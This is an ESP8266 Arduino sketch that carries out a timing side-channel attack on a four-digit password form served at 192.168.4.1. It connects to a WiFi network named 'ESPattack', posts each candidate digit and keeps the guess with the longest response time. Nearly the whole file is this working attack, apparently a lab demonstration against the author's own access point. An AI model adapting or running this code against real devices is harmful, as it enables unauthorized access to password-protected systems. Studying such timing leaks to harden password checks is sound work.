#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>

const char* ssid = "ESPattack";
const char* password = "password123";
const char* serverName = "http://192.168.4.1/password"; // Default IP for ESP8266 AP mode

void setup() {
  Serial.begin(115200);
  WiFi.begin(ssid, password);
  while (WiFi.status() != WL_CONNECTED) {
    delay(1000);
    Serial.println("Connecting to WiFi...");
  }
  Serial.println("Connected to WiFi");
  Serial.print("Client IP Address: ");
  Serial.println(WiFi.localIP());
}

void loop() {
  if (WiFi.status() == WL_CONNECTED) {
    long longestTime = 0;
    String longestPassword;
    String basePassword = "0000";
    
    // Loop over each digit position
    for (int digit = 0; digit < 4; digit++) {
      String basePassword = longestPassword.substring(0, digit) + String("0000").substring(digit, 4);
      longestTime = 0;

      for (int i = 0; i <= 9; i++) {
        String test_password = basePassword.substring(0, digit) + String(i) + basePassword.substring(digit + 1);

        WiFiClient client;
        HTTPClient http;
        http.begin(client, serverName);

        http.addHeader("Content-Type", "application/x-www-form-urlencoded");
        String httpRequestData = "password=" + test_password;

        unsigned long startTime = millis();
        int httpResponseCode = http.POST(httpRequestData);
        unsigned long endTime = millis();

        long responseTime = endTime - startTime;

        if (httpResponseCode > 0) {
          String payload = http.getString();
          Serial.println("Response Code: " + String(httpResponseCode));
          Serial.println("Payload: " + payload);
          Serial.println("Response Time: " + String(responseTime) + " ms");
        } else {
          Serial.print("Error on sending POST: ");
          Serial.println(httpResponseCode);
          Serial.println("Error message: " + http.errorToString(httpResponseCode));
        }

        http.end();

        if (responseTime > longestTime) {
          longestTime = responseTime;
          longestPassword = test_password;
        }

        delay(500); // Small delay to avoid flooding the server
      }

      Serial.println("Password with longest response time for digit " + String(digit + 1) + ": " + longestPassword);
      Serial.println("Longest Response Time: " + String(longestTime) + " ms");
    }

    // For demonstration, add a delay before restarting the loop
    delay(60000);
  } else {
    Serial.println("WiFi Disconnected");
    delay(5000); // Try reconnecting every 5 seconds
    WiFi.begin(ssid, password);
  }
}
